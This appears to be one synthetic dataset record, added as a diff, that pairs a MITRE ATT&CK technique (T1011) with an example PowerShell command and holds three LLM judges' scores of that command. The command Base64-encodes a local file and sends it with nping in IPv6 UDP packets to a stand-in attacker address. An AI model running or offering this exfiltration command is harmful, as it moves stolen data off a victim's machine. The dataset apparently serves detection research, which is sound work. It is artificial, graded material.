@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$b=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\ProgramData\\acct.bin')); nping.exe -6 --udp --dest-port 56123 --data-string $b -c 3 --rate 1 2001:db8:dead:beef::22",
+  "explanation": "Leverages nping to send multiple IPv6 UDP packets carrying Base64 data to an uncommon port, acting over a medium (IPv6/UDP) distinct from standard HTTP/HTTPS exfil paths, consistent with T1011.",
+  "rationale_steps": [
+    "Encode target data in Base64 to reduce casual readability.",
+    "Transmit in a few paced UDP bursts over IPv6 to an uncommon destination port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-6919b9bb-5fd99f37",
+  "source_prompt_hash": "6919b9bb",
+  "timestamp_utc": "2025-09-30T08:36:22.996855Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell assignment and semicolon chaining are correct, quotes and parentheses are balanced, and nping flags (-6, --udp, --dest-port, --data-string, -c, --rate) are valid and parseable.",
+        "semantic_score": 2,
+        "semantic_justification": "Although the command can transmit file bytes as Base64 in IPv6/UDP packets, this represents exfiltration over an alternative protocol (T1048) rather than a different network medium (T1011), and it may also fail without elevated privileges and uses a documentation-only IPv6 address.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-09-30T23:38:54.532592Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignment, correct method calls, and valid nping syntax with appropriate flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by reading a file, encoding it to Base64, and exfiltrating it over IPv6 UDP (an alternative network medium) to a specific destination using nping, which is operationally plausible.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T23:38:57.359227Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Powershell variable assignment is perfectly formed, and the `nping.exe` call uses correct syntax, balanced elements, and valid flags for its arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively prepares data for exfiltration by encoding it and then uses `nping.exe` to send it over IPv6 UDP, a distinct network protocol and layer from common exfiltration paths, aligning perfectly with T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-09-30T23:39:14.133442Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
